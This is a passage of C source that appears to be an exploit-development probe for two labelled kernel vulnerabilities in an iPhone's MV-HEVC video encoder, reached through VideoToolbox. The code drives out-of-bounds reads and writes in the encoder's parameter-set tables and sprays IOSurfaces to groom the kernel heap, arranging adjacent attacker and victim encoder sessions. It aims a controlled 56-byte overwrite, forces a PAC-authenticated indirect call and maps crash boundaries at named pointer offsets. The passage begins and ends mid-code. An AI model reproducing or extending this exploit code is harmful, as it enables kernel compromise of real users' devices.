    size_t max_count = 0, max_bytes = 0;
    for (int i = 0; i < encodes; i++) {
        int st = encode_one(s, i, 128, 128);
        if (i == 0) {
            baseline_count = g_last_pset_count;
            baseline_bytes = g_last_pset_total_bytes;
            rlog("Baseline: psets=%zu, bytes=%zu\n", baseline_count, baseline_bytes);
        }
        if (g_last_pset_count > max_count) max_count = g_last_pset_count;
        if (g_last_pset_total_bytes > max_bytes) max_bytes = g_last_pset_total_bytes;
        if (st != 0) {
            rlog("[%d] Error: %d\n", i, st);
            break;
        }
        if ((i+1) % 50 == 0 || i == encodes-1)
            rlog("[%d] psets=%zu (max=%zu), bytes=%zu (max=%zu)\n",
                 i+1, g_last_pset_count, max_count, g_last_pset_total_bytes, max_bytes);
    }

    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
    usleep(500000);

    rlog("\nFinal: psets=%zu (baseline=%zu, max=%zu)\n",
         g_last_pset_count, baseline_count, max_count);
    rlog("       bytes=%zu (baseline=%zu, max=%zu)\n",
         g_last_pset_total_bytes, baseline_bytes, max_bytes);

    if (max_count > baseline_count) {
        rlog("*** OOB READ DETECTED: pset count grew from %zu to %zu ***\n",
             baseline_count, max_count);
        rlog("*** Extra entries contain KERNEL HEAP DATA ***\n");
    } else if (max_bytes > baseline_bytes * 2) {
        rlog("*** POSSIBLE OOB READ: total bytes grew significantly ***\n");
    } else {
        rlog("No obvious OOB read detected in parameter set metadata\n");
        rlog("Note: read path may use separate counter or clamp differently\n");
    }

    VTCompressionSessionInvalidate(s); CFRelease(s);
    return 0;
}

/* Phase 5: Firmware parameter corruption with controlled layer_id */
static int phase5_firmware(int encodes, int layer_id) {
    rlog("\n========== PHASE 5: Firmware Param Corruption ==========\n");
    rlog("Target: %d encodes with layer_id=%d (0x%x)\n", encodes, layer_id, layer_id);
    rlog("layer_id is written at byte position 4 of each 16-byte entry\n");
    rlog("All key targets at byte 4 = layer_id = FULLY CONTROLLED:\n");
    rlog("  +0x5D14 (entry 602): guard array — layer_id misroutes params\n");
    rlog("  +0x5ED4 (entry 630): 56-byte SIMD overwrite source\n");
    rlog("  +0x5F94 (entry 642): nonzero forces BLRAA indirect call\n");
    rlog("  +0x6414 (entry 714): W24 config override\n\n");

    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, layer_id);
    if (!s) return -1;

    int errors = 0;
    for (int i = 0; i < encodes; i++) {
        int st = encode_one(s, i, 128, 128);
        if (st != 0) {
            errors++;
            rlog("[%d] Error: %d\n", i, st);
            if (errors >= 5) break;
        }
        if ((i+1) % 25 == 0 || i == encodes-1) {
            int est_entries = (i+1) * 3;
            const char *target = "pre-OOB";
            if (est_entries >= 714) target = "+0x6414 W24 REACHED";
            else if (est_entries >= 642) target = "+0x5F94 BLRAA REACHED";
            else if (est_entries >= 630) target = "+0x5ED4 SIMD REACHED";
            else if (est_entries >= 602) target = "+0x5D14 guard REACHED";
            else if (est_entries >= 256) target = "OOB active";
            rlog("[%d/%d] status=%d, ~%d entries, %s\n",
                 i+1, encodes, (int)g_cb_status, est_entries, target);
        }
    }

    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
    usleep(500000);

    rlog("\nPost-corruption test encode...\n");
    int st = encode_one(s, encodes, 128, 128);
    rlog("Post-corruption: status=%d\n", st);

    VTCompressionSessionInvalidate(s); CFRelease(s);

    if (errors == 0)
        rlog("ALL %d ENCODES SUCCEEDED — firmware params silently corrupted\n", encodes);
    return errors;
}

/* Phase 6: IOSurface spray + encode for cross-buffer corruption detection */
#define SPRAY_COUNT 64

static IOSurfaceRef g_surfaces[SPRAY_COUNT];

static IOSurfaceRef create_spray_surface(int idx) {
    int alloc = 36864;
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int w = 96, h = 96, bpr = 384;
    CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef nbpr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
    CFNumberRef nalloc = CFNumberCreate(NULL, kCFNumberIntType, &alloc);
    int fmt = 0x42475241;
    CFNumberRef nfmt = CFNumberCreate(NULL, kCFNumberIntType, &fmt);
    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nw);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nh);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nbpr);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nalloc);
    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nfmt);
    IOSurfaceRef surf = IOSurfaceCreate(props);
    CFRelease(nw); CFRelease(nh); CFRelease(nbpr); CFRelease(nalloc);
    CFRelease(nfmt); CFRelease(props);
    if (surf) {
        uint32_t tag = 0x53505259;
        CFNumberRef nsen = CFNumberCreate(NULL, kCFNumberIntType, &tag);
        IOSurfaceSetValue(surf, CFSTR("SprayTag"), nsen);
        CFRelease(nsen);
        IOSurfaceLock(surf, 0, NULL);
        void *base = IOSurfaceGetBaseAddress(surf);
        if (base) {
            memset(base, 0xAA, alloc);
            uint32_t *p32 = (uint32_t *)base;
            p32[0] = tag;
            p32[1] = (uint32_t)idx;
            for (int m = 4096; m < alloc; m += 4096) {
                p32[m/4] = 0xBEAC0000 | (idx & 0xFFFF);
            }
        }
        IOSurfaceUnlock(surf, 0, NULL);
    }
    return surf;
}

static int phase6_spray(int encodes) {
    rlog("\n========== PHASE 6: IOSurface Spray + OOB ==========\n");
    rlog("Spray %d IOSurfaces (36864 bytes each = kalloc.49152)\n", SPRAY_COUNT);
    rlog("HEVC buffer is ~39696 bytes in kalloc.49152 (or kalloc_data)\n");
    rlog("If HEVC buffer lands adjacent, OOB past entry 1059 (~353 enc)\n");
    rlog("corrupts next allocation\n\n");

    rlog("Phase 6a: Pre-spray %d surfaces\n", SPRAY_COUNT/2);
    for (int i = 0; i < SPRAY_COUNT/2; i++)
        g_surfaces[i] = create_spray_surface(i);

    rlog("Phase 6b: Create encoder (allocates HEVC buffer)\n");
    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 0x4141);
    if (!s) {
        rlog("FAILED: Could not create encoder\n");
        for (int i = 0; i < SPRAY_COUNT/2; i++)
            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
        return -1;
    }

    rlog("Phase 6c: Post-spray %d more surfaces\n", SPRAY_COUNT/2);
    for (int i = SPRAY_COUNT/2; i < SPRAY_COUNT; i++)
        g_surfaces[i] = create_spray_surface(i);

    rlog("Phase 6d: Encode %d frames (need ~353 for cross-buffer)\n", encodes);
    int errors = 0;
    for (int i = 0; i < encodes; i++) {
        int st = encode_one(s, i, 128, 128);
        if (st != 0) {
            errors++;
            rlog("[%d] Error: %d\n", i, st);
            if (errors >= 5) break;
        }
        if ((i+1) % 50 == 0 || i == encodes-1) {
            int est_entries = (i+1) * 3;
            rlog("[%d/%d] ~%d entries, cross-buffer: %s\n",
                 i+1, encodes, est_entries,
                 est_entries > 1059 ? "REACHED" : "not yet");
        }
    }

    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
    usleep(500000);

    rlog("\nPhase 6e: Check spray surfaces for corruption\n");
    int corrupted = 0;
    for (int i = 0; i < SPRAY_COUNT; i++) {
        if (!g_surfaces[i]) continue;
        IOSurfaceLock(g_surfaces[i], 1, NULL);
        void *base = IOSurfaceGetBaseAddress(g_surfaces[i]);
        if (base) {
            uint32_t *p32 = (uint32_t *)base;
            int changes = 0;
            for (int j = 2; j < 9216; j++) {
                if (p32[j] != 0xAAAAAAAA) {
                    if (!changes) {
                        rlog("  SURFACE[%d] CORRUPTED at +0x%x: 0x%08x (expected 0xAAAAAAAA)\n",
                             i, j*4, p32[j]);
                        for (int k = (j>2?j-2:0); k < j+8 && k < 9216; k++)
                            rlog("    [+0x%04x] 0x%08x%s\n", k*4, p32[k],
                                 p32[k] != 0xAAAAAAAA ? " *" : "");
                    }
                    changes++;
                }
            }
            if (changes) {
                corrupted++;
                rlog("  Surface[%d]: %d words changed\n", i, changes);
            }
        }
        IOSurfaceUnlock(g_surfaces[i], 1, NULL);
    }

    rlog("\nCorrupted surfaces: %d / %d\n", corrupted, SPRAY_COUNT);
    if (corrupted > 0)
        rlog("*** CROSS-BUFFER OOB INTO ADJACENT ALLOCATION CONFIRMED ***\n");

    VTCompressionSessionInvalidate(s); CFRelease(s);
    for (int i = 0; i < SPRAY_COUNT; i++)
        if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
    return corrupted;
}

typedef struct {
    int thread_id;
    int encodes;
    int errors;
    int max_pset_count;
    size_t max_pset_bytes;
    volatile int started;
    volatile int done;
} race_ctx_t;

static volatile int g_race_go = 0;

static void *race_thread_fn(void *arg) {
    race_ctx_t *ctx = (race_ctx_t *)arg;
    VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
    if (!s) {
        ctx->errors = -1;
        ctx->done = 1;
        return NULL;
    }
    ctx->started = 1;
    while (!g_race_go) usleep(100);

    for (int i = 0; i < ctx->encodes; i++) {
        int st = encode_one_stereo_kf(s, i, 1920, 1080, 1, 1);
        if (st != 0) {
            ctx->errors++;
            if (ctx->errors >= 10) break;
        }
        if ((int)g_last_pset_count > ctx->max_pset_count)
            ctx->max_pset_count = (int)g_last_pset_count;
        if (g_last_pset_total_bytes > ctx->max_pset_bytes)
            ctx->max_pset_bytes = g_last_pset_total_bytes;
    }
    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
    VTCompressionSessionInvalidate(s);
    CFRelease(s);
    ctx->done = 1;
    return NULL;
}

static int g_main_argc;
static char **g_main_argv;

static void *worker_thread(void *arg) {
    (void)arg;
    int argc = g_main_argc;
    char **argv = g_main_argv;

    char logpath[512];
    snprintf(logpath, sizeof(logpath), "%s/Documents/ave_%d.txt",
             getenv("HOME") ? getenv("HOME") : "/tmp", getpid());
    g_log = fopen(logpath, "w");
    /* Also write to fixed name for backward compat */
    char logpath2[512];
    snprintf(logpath2, sizeof(logpath2), "%s/Documents/ave_full_chain.txt",
             getenv("HOME") ? getenv("HOME") : "/tmp");
    FILE *f2 = fopen(logpath2, "w");
    if (f2) fclose(f2); /* truncate old */

    rlog("=== CVE-2026-114025 + CVE-2026-112465 Full Chain Probe ===\n");
    rlog("Target: iPhone Duo (A20 Pro, iOS 27.1)\n");
    rlog("Time: %s\n", __TIMESTAMP__);
    rlog("PID: %d\n\n", getpid());

    rlog("argc=%d\n", argc);
    for (int ai = 0; ai < argc && ai < 20; ai++)
        rlog("  argv[%d]='%s'\n", ai, argv[ai]);

    /* Check for mode override file (workaround for cached launch args) */
    char mode_buf[256] = {0};
    static char *file_argv[16] = {0};
    int file_argc = 0;
    char mode_file[512];
    snprintf(mode_file, sizeof(mode_file), "%s/Documents/mode.txt",
             getenv("HOME") ? getenv("HOME") : "/tmp");
    FILE *mf = fopen(mode_file, "r");
    if (mf) {
        if (fgets(mode_buf, sizeof(mode_buf), mf)) {
            char *nl = strchr(mode_buf, '\n');
            if (nl) *nl = '\0';
            nl = strchr(mode_buf, '\r');
            if (nl) *nl = '\0';
            /* Split mode_buf into tokens, override argc/argv */
            file_argv[0] = argv[0];
            file_argc = 1;
            char *tok = strtok(mode_buf, " ");
            while (tok && file_argc < 15) {
                file_argv[file_argc++] = tok;
                tok = strtok(NULL, " ");
            }
            argc = file_argc;
            argv = file_argv;
        }
        fclose(mf);
        remove(mode_file);
    }
    const char *mode = (argc > 1) ? argv[1] : "help";
    rlog("mode='%s' argc=%d (source=%s)\n\n", mode, argc,
         file_argc > 0 ? "mode.txt" : "argv");

    if (strcmp(mode, "quick") == 0) {
        rlog("QUICK: Phases 1-3 (verify + measure + 100 encodes)\n\n");
        if (phase1_verify() != 0) goto done;
        phase2_measure();
        phase3_overflow(100);

    } else if (strcmp(mode, "standard") == 0) {
        rlog("STANDARD: Phases 1-4 (+ 250 encodes + OOB read)\n\n");
        if (phase1_verify() != 0) goto done;
        phase2_measure();
        phase3_overflow(250);
        phase4_oob_read(300);

    } else if (strcmp(mode, "full") == 0) {
        rlog("FULL: All 6 phases\n\n");
        if (phase1_verify() != 0) goto done;
        phase2_measure();
        phase3_overflow(100);
        phase4_oob_read(300);
        phase5_firmware(220, 0x4141);
        phase6_spray(400);

    } else if (strcmp(mode, "blraa") == 0) {
        rlog("BLRAA: 250 encodes with layer_id=1 to trigger forced BLRAA\n");
        rlog("WARNING: Entry 642 (+0x5F94) nonzero forces PAC-auth indirect call\n");
        rlog("This WILL cause a kernel panic if PAC check fails!\n\n");
        if (phase1_verify() != 0) goto done;
        phase5_firmware(250, 1);

    } else if (strcmp(mode, "read_only") == 0) {
        rlog("READ_ONLY: OOB read test only (400 encodes)\n\n");
        if (phase1_verify() != 0) goto done;
        phase4_oob_read(400);

    } else if (strcmp(mode, "spray") == 0) {
        rlog("SPRAY: IOSurface spray + cross-buffer test (400 encodes)\n\n");
        if (phase1_verify() != 0) goto done;
        phase6_spray(400);

    } else if (strcmp(mode, "firmware") == 0) {
        int lid = (argc > 2) ? atoi(argv[2]) : 0x4141;
        int enc = (argc > 3) ? atoi(argv[3]) : 220;
        rlog("FIRMWARE: %d encodes with layer_id=0x%x\n\n", enc, lid);
        if (phase1_verify() != 0) goto done;
        phase5_firmware(enc, lid);

    } else if (strcmp(mode, "simd_target") == 0) {
        rlog("SIMD_TARGET: Precisely target entries #630-633 (56-byte overwrite)\n");
        rlog("The LDP Q0,Q1 + LDR Q2 + LDR X8 at 0x1765bcc copies 56 bytes\n");
        rlog("from entries 630-633 to target object at encoder+0x5C70->offset 0x00-0x37\n");
        rlog("Plus ~32 bytes to target+0xFC and 4 bytes to target+0x118\n\n");
        rlog("This probe encodes EXACTLY 211 frames (633 entries = entry #632)\n");
        rlog("to overwrite the target object header with our controlled data.\n");
        rlog("layer_id values at entries 630-633 become bytes 4-7 of each 16-byte entry\n\n");
        rlog("Strategy: Use different layer_id values to identify which entry maps where\n\n");
        if (phase1_verify() != 0) goto done;
        rlog("--- Sub-test A: 211 encodes with layer_id=0x4141 (generic marker) ---\n");
        phase5_firmware(211, 0x4141);
        rlog("\n--- Sub-test B: 210 encodes (stop just before SIMD overwrite) ---\n");
        rlog("This is the SAFE baseline — entries reach 630 but not all 4 needed\n");
        phase5_firmware(210, 0x4242);
        rlog("\n--- Sub-test C: 215 encodes with layer_id=0xDEAD (past BLRAA trigger) ---\n");
        rlog("WARNING: Entry 642 (+0x5F94) will be nonzero with NAL_type (1-3)\n");
        rlog("If +0x5F94 triggers, BLRAA with PAC mismatch -> KERNEL PANIC likely\n");
        rlog("Comment out this test if 211 encodes already panics\n");
        phase5_firmware(215, 0xDEAD);

    } else if (strcmp(mode, "simd_safe") == 0) {
        int lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0x4141;
        rlog("SIMD_SAFE: Exactly 210 encodes (stop BEFORE SIMD overwrite)\n");
        rlog("layer_id=0x%x, entries ~630 = at SIMD boundary but not complete\n", lid);
        rlog("This should be safe — the 56-byte copy needs entries 630-633\n\n");
        if (phase1_verify() != 0) goto done;
        phase5_firmware(210, lid);

    } else if (strcmp(mode, "cumsum_predict") == 0) {
        rlog("CUMSUM_PREDICT: Measure NAL sizes to predict cumsum at entry #593\n");
        rlog("+0x5C88 (SIMD target pointer) is at entry 593, byte offset 8 = cumsum\n");
        rlog("The cumsum value at entry 601 becomes the SIMD overwrite's target addr\n");
        rlog("If we can predict/control cumsum, we can redirect the 56-byte write\n\n");
        if (phase1_verify() != 0) goto done;
        rlog("Phase A: Detailed NAL measurement (20 encodes)\n\n");
        VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
        if (!s) goto done;
        size_t prev_bytes = 0;
        size_t total_nal_bytes = 0;
        int total_entries = 0;
        for (int i = 0; i < 20; i++) {
            int st = encode_one(s, i, 128, 128);
            size_t delta = g_last_pset_total_bytes - (i > 0 ? prev_bytes : 0);
            prev_bytes = g_last_pset_total_bytes;
            rlog("[%d] status=%d psets=%zu total_bytes=%zu delta=%zu\n",
                 i, st, g_last_pset_count, g_last_pset_total_bytes, delta);
            if (st != 0) break;
            total_entries += (int)g_last_pset_count;
            total_nal_bytes += delta;
        }
        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
        usleep(500000);
        VTCompressionSessionInvalidate(s); CFRelease(s);
        rlog("\nTotal: %d entries from 20 encodes = %.1f entries/encode\n",
             total_entries, total_entries / 20.0);
        rlog("Total NAL bytes: %zu\n", total_nal_bytes);
        if (total_entries > 0) {
            double avg_nal = (double)total_nal_bytes / total_entries;
            double avg_cumsum_inc = avg_nal / 8.0;
            double cumsum_at_593 = avg_cumsum_inc * 593;
            rlog("Average NAL size: %.1f bytes\n", avg_nal);
            rlog("Average cumsum increment (data>>3): %.2f per entry\n", avg_cumsum_inc);
            rlog("PREDICTED cumsum at entry 592 (+0x5C70 ptr low32): %.0f (0x%x)\n",
                 avg_cumsum_inc * 592, (uint32_t)(avg_cumsum_inc * 592));
            rlog("PREDICTED cumsum at entry 593 (+0x5C88 ptr low32): %.0f (0x%x)\n",
                 cumsum_at_593, (uint32_t)cumsum_at_593);
            rlog("PREDICTED cumsum at entry 630 (+0x5ED4 SIMD src): %.0f (0x%x)\n",
                 avg_cumsum_inc * 630, (uint32_t)(avg_cumsum_inc * 630));
            rlog("PREDICTED cumsum at entry 642 (+0x5F94 dispatch): %.0f (0x%x)\n",
                 avg_cumsum_inc * 642, (uint32_t)(avg_cumsum_inc * 642));
            rlog("\nFor IOSurface spray targeting:\n");
            rlog("  kalloc.49152 addresses typically align to 0x1000 pages\n");
            rlog("  Spray IOSurfaces, note addresses, then predict which\n");
            rlog("  encode count places cumsum near a spray address\n");
        }

    } else if (strcmp(mode, "dual") == 0) {
        rlog("DUAL: Multi-session spray + cross-buffer OOB + victim trigger\n");
        rlog("Using STEREO ENCODE (pset=4 per encode, 1920x1080)\n");
        rlog("WARNING: Requires 270 encodes. Table 1 crash boundary is at ~148.\n");
        rlog("Run 'crash_test' first! If crash at 148, this mode will kernel panic.\n");
        rlog("Only proceed if crash_test proved 150+ encodes survive.\n\n");
        rlog("1. Create 20 MV-HEVC sessions (spray HEVC buffers in kalloc_data.49152)\n");
        rlog("2. Free alternating sessions to create holes\n");
        rlog("3. Create attacker + victim sessions in holes\n");
        rlog("4. Attacker encodes 270 frames -> cross-buffer OOB into victim +0x8\n");
        rlog("5. Victim encodes 1 frame -> corrupted loop bound -> stack overflow\n\n");
        if (phase1_verify() != 0) goto done;

        rlog("\n--- Phase A: Create 20 spray sessions ---\n");
        #define DUAL_SPRAY 20
        VTCompressionSessionRef spray_sessions[DUAL_SPRAY];
        for (int i = 0; i < DUAL_SPRAY; i++) {
            spray_sessions[i] = create_mvhevc_encoder(1920, 1080, 1);
            if (!spray_sessions[i]) {
                rlog("Session %d creation failed\n", i);
            } else {
                int st = encode_one_stereo(spray_sessions[i], 0, 1920, 1080);
                rlog("Session %d: created, first encode status=%d\n", i, st);
            }
        }

        rlog("\n--- Phase B: Free alternating sessions ---\n");
        for (int i = 0; i < DUAL_SPRAY; i += 2) {
            if (spray_sessions[i]) {
                VTCompressionSessionInvalidate(spray_sessions[i]);
                CFRelease(spray_sessions[i]);
                spray_sessions[i] = NULL;
                rlog("Freed session %d\n", i);
            }
        }
        usleep(100000);

        rlog("\n--- Phase C: Create attacker (lid=1) + victim (lid=1) ---\n");
        rlog("Note: layer_id forced to 1 for stereo encode (tags must match)\n");
        VTCompressionSessionRef attacker = create_mvhevc_encoder(1920, 1080, 1);
        VTCompressionSessionRef victim = create_mvhevc_encoder(1920, 1080, 1);
        if (!attacker || !victim) {
            rlog("FAILED to create attacker/victim\n");
            goto dual_cleanup;
        }
        int ast = encode_one_stereo(attacker, 0, 1920, 1080);
        int vst = encode_one_stereo(victim, 0, 1920, 1080);
        rlog("Attacker first encode: %d, Victim first encode: %d\n", ast, vst);

        rlog("\n--- Phase D: Attacker encodes 270 frames ---\n");
        rlog("Target: entry 1059+ (~265 enc) for cross-buffer OOB\n");
        int atk_errors = 0;
        for (int i = 1; i < 270; i++) {
            int st = encode_one_stereo(attacker, i, 1920, 1080);
            if (st != 0) {
                atk_errors++;
                rlog("[ATK %d] Error: %d\n", i, st);
                if (atk_errors >= 5) break;
            }
            if ((i+1) % 50 == 0 || i == 269) {
                int est = (i+1) * 4;
                rlog("[ATK %d/%d] ~%d entries, cross-buffer: %s\n",
                     i+1, 270, est, est > 1059 ? "REACHED" : "not yet");
            }
        }

        rlog("\n--- Phase E: Victim encodes 1 frame (may trigger stack overflow) ---\n");
        rlog("If victim +0x8 was corrupted to ~700, the loop at 0x1915168\n");
        rlog("runs 700 iterations × 256-byte format = stack overflow\n");
        rlog("Saved registers x19-x28 corrupted on stack\n");
        rlog("WARNING: This may cause a kernel panic!\n\n");
        vst = encode_one_stereo(victim, 1, 1920, 1080);
        rlog("Victim second encode: status=%d\n", vst);
        rlog("If we get here, either:\n");
        rlog("  a) Cross-buffer did not reach victim (not adjacent)\n");
        rlog("  b) Victim +0x8 was not corrupted to exploitable value\n");
        rlog("  c) Stack overflow was caught by guard page\n");
        rlog("  d) PAC failure on return address caused graceful error\n");

        rlog("\n--- Phase F: Check victim parameter sets for OOB data ---\n");
        rlog("Victim pset_count=%zu, pset_bytes=%zu\n",
             g_last_pset_count, g_last_pset_total_bytes);

        dual_cleanup:
        if (attacker) { VTCompressionSessionInvalidate(attacker); CFRelease(attacker); }
        if (victim) { VTCompressionSessionInvalidate(victim); CFRelease(victim); }
        for (int i = 0; i < DUAL_SPRAY; i++)
            if (spray_sessions[i]) {
                VTCompressionSessionInvalidate(spray_sessions[i]);
                CFRelease(spray_sessions[i]);
            }

    } else if (strcmp(mode, "table2_heap") == 0) {
        rlog("TABLE2_HEAP: Second VPS table OOB + IOSurface spray test\n");
        rlog("Both VPS tables overflow simultaneously during MV-HEVC encoding.\n");
        rlog("NOTE: Buffer is 0x9B10 bytes in 0xC000 kalloc.49152 allocation.\n");
        rlog("Table 2 OOB at 197 enc reaches +0xA2E4 — within allocation padding.\n");
        rlog("Cross-allocation needs 1057 entries (~352 enc) — past crash limit.\n");
        rlog("This test checks: a) if table 2 OOB corrupts driver state at +0x8DF4-0x9B10\n");
        rlog("  b) if IOSurface spray lands in adjacent allocation (observable via readback)\n");
        rlog("Table 1 hits +0x5C70 at entry 592 → crash at ~197 encodes.\n\n");
        if (phase1_verify() != 0) goto done;

        int t2_encodes = (argc > 2) ? atoi(argv[2]) : 170;
        int t2_lid = (argc > 3) ? (int)strtol(argv[3], NULL, 0) : 0x4141;
        if (t2_encodes > 195) {
            rlog("WARNING: >195 encodes risks table 1 +0x5C70 crash at ~197!\n");
            rlog("Clamping to 195.\n");
            t2_encodes = 195;
        }

        rlog("--- Step 1: Pre-spray %d IOSurfaces ---\n", SPRAY_COUNT/2);
        for (int i = 0; i < SPRAY_COUNT/2; i++)
            g_surfaces[i] = create_spray_surface(i);

        rlog("--- Step 2: Create MV-HEVC encoder (lid=0x%x, 1920x1080 stereo) ---\n", t2_lid);
        VTCompressionSessionRef t2s = create_mvhevc_encoder(1920, 1080, t2_lid);
        if (!t2s) {
            rlog("FAILED: Could not create encoder\n");
            for (int i = 0; i < SPRAY_COUNT/2; i++)
                if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
            goto done;
        }

        rlog("--- Step 3: Post-spray %d more IOSurfaces ---\n", SPRAY_COUNT/2);
        for (int i = SPRAY_COUNT/2; i < SPRAY_COUNT; i++)
            g_surfaces[i] = create_spray_surface(i);

        rlog("--- Step 4: Encode %d frames (stereo, pset=4, table 2 heap overflow at ~117) ---\n", t2_encodes);
        int t2_errors = 0;
        for (int i = 0; i < t2_encodes; i++) {
            int st = encode_one_stereo(t2s, i, 1920, 1080);
            if (st != 0) {
                t2_errors++;
                rlog("[%d] Error: %d\n", i, st);
                if (t2_errors >= 5) break;
            }
            if ((i+1) % 25 == 0 || i == t2_encodes-1) {
                int t1_entries = (i+1) * 4;
                int t2_entries = (i+1) * 4;
                const char *t1_state = "pre-OOB";
                if (t1_entries >= 592) t1_state = "DANGER: +0x5C70 hit!";
                else if (t1_entries >= 256) t1_state = "OOB (safe range)";
                const char *t2_state = "pre-OOB";
                if (t2_entries >= 466) t2_state = "ALLOC PADDING OOB (not cross-alloc)";
                else if (t2_entries >= 256) t2_state = "intra-buffer OOB";
                rlog("[%d/%d] T1: ~%d entries (%s) | T2: ~%d entries (%s)\n",
                     i+1, t2_encodes, t1_entries, t1_state, t2_entries, t2_state);
            }
        }

        VTCompressionSessionCompleteFrames(t2s, kCMTimeInvalid);
        usleep(500000);

        rlog("\n--- Step 5: Check spray surfaces for corruption ---\n");
        int t2_corrupted = 0;
        for (int i = 0; i < SPRAY_COUNT; i++) {
            if (!g_surfaces[i]) continue;
            IOSurfaceLock(g_surfaces[i], 1, NULL);
            void *base = IOSurfaceGetBaseAddress(g_surfaces[i]);
            if (base) {
                uint32_t *p32 = (uint32_t *)base;
                int changes = 0;
                for (int j = 2; j < 9216; j++) {
                    if (p32[j] != 0xAAAAAAAA) {
                        if (!changes) {
                            rlog("  SURFACE[%d] CORRUPTED at +0x%x: 0x%08x\n",
                                 i, j*4, p32[j]);
                            for (int k = (j>2?j-2:0); k < j+8 && k < 9216; k++)
                                rlog("    [+0x%04x] 0x%08x%s\n", k*4, p32[k],
                                     p32[k] != 0xAAAAAAAA ? " *" : "");
                        }
                        changes++;
                    }
                }
                if (changes) {
                    t2_corrupted++;
                    rlog("  Surface[%d]: %d words changed\n", i, changes);
                }
            }
            IOSurfaceUnlock(g_surfaces[i], 1, NULL);
        }

        rlog("\nCorrupted surfaces: %d / %d\n", t2_corrupted, SPRAY_COUNT);
        if (t2_corrupted > 0) {
            rlog("*** TABLE 2 HEAP OVERFLOW INTO ADJACENT IOSurface CONFIRMED ***\n");
            rlog("*** layer_id=0x%x values should appear at byte position 4 ***\n", t2_lid);
        } else {
            rlog("No corruption detected. Possible reasons:\n");
            rlog("  - HEVC buffer not adjacent to any spray surface\n");
            rlog("  - Table 2 not written during MV-HEVC (needs on-device verification)\n");
            rlog("  - Entries per encode differ from expected ~3\n");
        }

        VTCompressionSessionInvalidate(t2s); CFRelease(t2s);
        for (int i = 0; i < SPRAY_COUNT; i++)
            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }

    } else if (strcmp(mode, "crash_test") == 0) {
        rlog("CRASH_TEST: Incrementally encode to find the ACTUAL crash boundary\n");
        rlog("Using STEREO ENCODE (pset=4 per encode, 1920x1080)\n");
        rlog("Known pointer fields in OOB range (may crash when overwritten):\n");
        rlog("  Entry 274 (+0x4890, ~69 enc): 64-bit pointer, used in struct setup\n");
        rlog("  Entry 297 (+0x4A00, ~75 enc): 5 refs, heavily used field\n");
        rlog("  Entry 421 (+0x51C8, ~106 enc): pointer chain walk dereference\n");
        rlog("  Entry 536 (+0x58F8, ~134 enc): LDR X1 → DEREF [X1+0] and [X1+0x28]\n");
        rlog("  Entry 579 (+0x5BA0, ~145 enc): passed as arg0 to function call\n");
        rlog("  Entry 592 (+0x5C70, ~148 enc): SIMD copy target pointer\n");
        rlog("Strategy: batch to 63 (pre-OOB), then one-at-a-time through danger zones.\n\n");
        if (phase1_verify() != 0) goto done;
        int ct_lid = 1;
        rlog("layer_id=0x%x (forced to 1 for stereo — tags must match session config)\n", ct_lid);
        VTCompressionSessionRef ct_s = create_mvhevc_encoder(1920, 1080, ct_lid);
        if (!ct_s) { rlog("FAILED: encoder creation\n"); goto done; }
        rlog("Phase A: Pre-OOB baseline (63 encodes, ~252 entries)\n");
        for (int i = 0; i < 63; i++) {
            int st = encode_one_stereo(ct_s, i, 1920, 1080);
            if (st != 0) { rlog("[%d] ENCODE ERROR: %d (pre-OOB!)\n", i, st); break; }
            if ((i+1) % 20 == 0) rlog("[%d] ok, ~%d entries\n", i+1, (i+1)*4);
        }
        rlog("\nPhase B: OOB region, one encode at a time (63-160)\n");
        rlog("Watching for crashes at pointer field boundaries.\n\n");
        for (int i = 63; i < 160; i++) {
            int entries = (i+1)*4;
            const char *zone = "";
            if (entries >= 592) zone = " [+0x5C70 SIMD ptr]";
            else if (entries >= 579) zone = " [+0x5BA0 func ptr]";
            else if (entries >= 536) zone = " [+0x58F8 deref ptr]";
            else if (entries >= 421) zone = " [+0x51C8 chain walk]";
            else if (entries >= 297) zone = " [+0x4A00 heavy use]";
            else if (entries >= 274) zone = " [+0x4890 struct ptr]";
            else if (entries >= 256) zone = " [OOB started]";
            rlog("[%d] entries ~%d (+0x%x)%s... ",
                 i, entries, 0x3770 + entries*16, zone);
            fflush(stdout);
            int st = encode_one_stereo(ct_s, i, 1920, 1080);
            if (st != 0) {
                rlog("ERROR %d\n", st);
                rlog("*** CRASH BOUNDARY: encode %d (entries ~%d) ***\n", i, entries);
                rlog("*** Last safe encode: %d (entries ~%d) ***\n", i-1, (i)*4);
                break;
            }
            rlog("OK\n");
            if (i == 68) {
                rlog("  → Survived entry 276 (+0x4890) overwrite\n");
            } else if (i == 74) {
                rlog("  → Survived entry 300 (+0x4A00) overwrite\n");
            } else if (i == 105) {
                rlog("  → Survived entry 424 (+0x51C8) overwrite\n");
            } else if (i == 133) {
                rlog("  → Survived entry 536 (+0x58F8) overwrite — pointer deref field OK\n");
            } else if (i == 144) {
                rlog("  → Survived entry 580 (+0x5BA0) overwrite — func ptr field OK\n");
            } else if (i == 147) {
